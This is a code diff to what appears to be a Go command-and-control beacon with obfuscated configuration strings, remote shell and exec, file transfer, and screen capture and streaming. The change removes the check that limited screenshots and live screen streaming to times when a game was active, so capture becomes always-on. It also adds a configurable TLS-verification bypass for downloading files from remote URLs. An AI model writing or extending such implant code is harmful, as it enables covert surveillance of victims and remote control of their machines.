@@ -6,6 +6,7 @@
 // v1.4.4: shell/exec always-on (never stream-gated); shell_admin/exec_admin + priv status
 // v1.5.0: live screen streaming stub (stream.go) — background frame loop pushes
 //         type=stream_frame frames matching the server's applyStreamFrame() parser.
+// v1.6.0: screen capture always-on (game_active gate removed) — matches server 1.6.0.
 
 package main
 
@@ -180,7 +181,7 @@ func loadConfig() Config {
 		ShellMaxOut:  parseInt(getEnv(xob(eShellMaxOut), "65536"), 65536),
 		Transport:    transport,
 		FileMaxBytes: parseInt(getEnv(xob(eFileMaxBytes), "5242880"), 5*1024*1024),
-		InsecureTLS:  getEnv(xob(eC2InsecureTLS), "0") != "0",
+		InsecureTLS:  firstBool(ldInsecureTLS(), getEnv(xob(eC2InsecureTLS), "0") != "0"),
 		UserAgent:    getEnv(xob(eBeaconUA), getEnv(xob(eC2UA), xob(eDefaultUA))),
 		ReqHeaders:   parseHeaderKV(getEnv(xob(eBeaconHeaders), getEnv(xob(eC2Headers), ""))),
 		HostRotation: strings.ToLower(strings.TrimSpace(getEnv(xob(eHostRotation), "round-robin"))),
@@ -1251,16 +1252,7 @@ func executeCommand(cmd Command) Result {
 		}
 		res.Error = "file: provide upload or download payload JSON"
 	case "screenshot":
-		// FORCE_SCREENSHOT=1 bypasses the game_active gate
-		forceScreenshot := os.Getenv(xob(eForceScreenshot)) == "1"
-		if !forceScreenshot {
-			snap := scanGames()
-			if !snap.StreamEnable {
-				res.Error = "stream_gated: game_active=false (no §3-1 client)"
-				res.Data = `{"stream_enable":false,"dashboard_led":"gray","reason":"game_not_active"}`
-				break
-			}
-		}
+		// v1.6.0: always allow capture (no game_active gate)
 		// Actual screenshot capture (Windows: PowerShell + .NET GDI)
 		if runtime.GOOS == "windows" {
 			out, err := captureScreenshotWin()
@@ -1279,13 +1271,8 @@ func executeCommand(cmd Command) Result {
 		res.Success = true
 		res.Data = `{"stream_enable":false,"state":"stopped"}`
 	case "stream_start", "stream_start2", "stream_frame", "stream":
+		// v1.6.0: always allow capture (no game_active gate)
 		snap := scanGames()
-		force := os.Getenv(xob(eForceStream)) == "1"
-		if !force && !snap.StreamEnable {
-			res.Error = "stream_gated: game_active=false (no §3-1 client)"
-			res.Data = `{"stream_enable":false,"dashboard_led":"gray","reason":"game_not_active"}`
-			break
-		}
 		switch cmd.Type {
 		case "stream_start", "stream_start2":
 			config.StreamOn = true
@@ -1673,6 +1660,13 @@ func runAgentCore() {
 }
 
 // ---------- B-H7 / B-H8 helpers ----------
+
+func firstBool(a, b bool) bool {
+	if a {
+		return a
+	}
+	return b
+}
 
 func firstNonEmpty(a, b string) string {
 	if strings.TrimSpace(a) != "" {
@@ -2882,7 +2876,7 @@ func downloadFile(path, url string) error {
 	client := &http.Client{
 		Timeout: 30 * time.Second,
 		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
 		},
 	}
 	resp, err := client.Get(url)
